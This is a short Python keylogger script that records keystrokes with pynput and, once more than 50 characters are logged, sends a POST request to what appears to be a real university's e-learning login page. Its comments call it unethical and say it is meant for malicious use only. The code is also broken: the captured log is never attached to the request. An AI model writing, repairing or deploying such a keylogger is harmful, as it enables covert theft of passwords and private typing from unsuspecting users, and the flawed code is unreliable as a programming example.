import pynput.keyboard
import requests

log=""
def on_press(key):
    global log
    log +=str(key)
    if len(log)>50:
        #send the log to a remote server
        requests.post("https://elearning.zetech.ac.ke/login/index.php")
        data={"log":log}
        log=""
                 
listener=pynput.keyboard.Listener(on_press=on_press)
listener.start()
#this keylogger is not ethical and has some errors 
#its not written quite well and should be used for malicious purposes only
